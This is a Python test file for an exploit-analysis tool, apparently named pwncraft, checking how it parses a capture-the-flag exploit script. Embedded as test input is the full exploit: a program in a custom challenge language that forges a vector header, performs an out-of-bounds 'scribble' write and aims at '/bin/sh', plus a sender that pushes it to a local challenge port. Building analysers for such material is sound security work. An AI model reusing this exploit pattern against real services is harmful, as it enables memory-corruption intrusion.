import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
AUTOCORRECT = ROOT / "autocorrect"
PROJECT = ROOT / "pwncraft"
for path in (AUTOCORRECT, PROJECT):
    if str(path) not in sys.path:
        sys.path.insert(0, str(path))

from challenge_intake import load_splits, split_for_case
from pwncraft.features.audit.semantic_facts import analyze_exp_semantics

CASE_ID = "memory_write-sctf-2026-slang-a31e8aa0"
TRUTH = ROOT / "autocorrect" / "cases" / CASE_ID / "expected_truth_cycle15.json"

OFFICIAL_EXP_SHAPE = r'''PAYLOAD = r''' + "'''" + r'''function one() : -> int {
  return 1;
}

function forge() : -> str {
  return "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x7f";
}

function pwn(int round, vec forged_vec) : -> void {
  if (round == 0) {
    return;
  };
  say("resolve puts");
  scribble(forged_vec, 526339, -205200);
  say("/bin/sh");
  return;
}

function main() : int round, int keep_marker, vec vec_slot, str forged_header -> int {
  vec_slot := vec_new(0);
  round := 0;
  keep_vec(vec_slot);

  do {
    pwn(round, vec_slot);
    forged_header := forge();
    keep_marker := one() + 1234;
    round := round + 1;
  } while (round < 2);

  keep_str(forged_header);
  keep_int(keep_marker);
  return 0;
}
''' + "'''" + r'''

def main():
    source = PAYLOAD + "END_OF_SOURCE\n"
    with socket.create_connection(("127.0.0.1", 9999), timeout=5) as sock:
        sock.sendall(source.encode())
'''


def _function(program: dict, name: str) -> dict:
    return next(item for item in program["functions"] if item["name"] == name)


def test_case_remains_train_and_truth_revision_is_separate() -> None:
    assert split_for_case(CASE_ID, load_splits()) == "train"
    truth = json.loads(TRUTH.read_text(encoding="utf-8"))
    assert truth["truth_lock"]["truth_revision"] == 2
    assert truth["truth_lock"]["supersedes"] == "truth-sctf2026-slang-outbound-payload-v1"
    assert truth["materials"]["embedded_slang_git_blob_sha1"] == \
        "7b7bd122aef50d6bc2a27218a48f4107d0a51d1f"


def test_official_transport_now_exposes_typed_embedded_structure() -> None:
    result = analyze_exp_semantics(OFFICIAL_EXP_SHAPE)
    assert result["status"] == "ok"
    assert len(result["embedded_programs"]) == 1
    program = result["embedded_programs"][0]
    assert program["provenance"] == "OUTBOUND_LITERAL_EMBEDDED_STRUCTURE"
    pwn = _function(program, "pwn")
    assert [(p["type_name"], p["name"]) for p in pwn["parameters"]] == [
        ("int", "round"), ("vec", "forged_vec")
    ]
    main = _function(program, "main")
    assert [(p["type_name"], p["name"]) for p in main["locals"]] == [
        ("int", "round"), ("int", "keep_marker"),
        ("vec", "vec_slot"), ("str", "forged_header")
    ]


def test_official_do_while_order_is_preserved_without_claiming_slot_alias() -> None:
    result = analyze_exp_semantics(OFFICIAL_EXP_SHAPE)
    program = result["embedded_programs"][0]
    main = _function(program, "main")
    loop = [s for s in main["statements"] if s["loop_depth"] == 1]
    call_index = next(i for i, s in enumerate(loop) if s["callee"] == "pwn")
    forge_index = next(i for i, s in enumerate(loop) if s["target"] == "forged_header")
    assert call_index < forge_index
    assert loop[call_index]["arguments"] == ["round", "vec_slot"]
    assert loop[forge_index]["callee"] == "forge"

    # The compiler-specific alias/type-confusion step is still intentionally not
    # promoted from source shape alone.
    assert result["primitives"] == []
    truth = json.loads(TRUTH.read_text(encoding="utf-8"))
    assert "automatic compiler slot-reuse reconstruction is not implemented in this cycle" in truth["unknown"]


def test_scribble_is_call_shape_evidence_not_arbitrary_write_by_name() -> None:
    result = analyze_exp_semantics(OFFICIAL_EXP_SHAPE)
    pwn = _function(result["embedded_programs"][0], "pwn")
    scribble = next(s for s in pwn["statements"] if s["callee"] == "scribble")
    assert scribble["arguments"] == ["forged_vec", "526339", "-205200"]
    assert result["primitives"] == []
